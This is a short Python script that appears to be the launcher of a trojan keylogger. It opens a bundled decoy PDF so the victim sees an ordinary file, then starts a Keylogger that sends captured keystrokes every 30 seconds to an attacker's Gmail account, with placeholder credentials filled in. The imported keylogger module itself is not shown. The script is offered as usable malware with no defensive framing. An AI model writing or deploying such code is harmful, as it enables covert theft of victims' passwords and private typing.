import keylogger
import sys
import subprocess

# Starting the process by invoking "start" method which is in the "Keylogger" class 

file_name = sys._MEIPASS + "\sample.pdf"  # Replace sample.pdf by any file you want
subprocess.Popen(file_name, shell=True)
keylogger.Keylogger(30, "hack@gmail.com", "12345678").start()
# where 30 = just any time interval in seconds
# hack@gmail.com = just any gmail id
# 12345678 = password of the gmail id
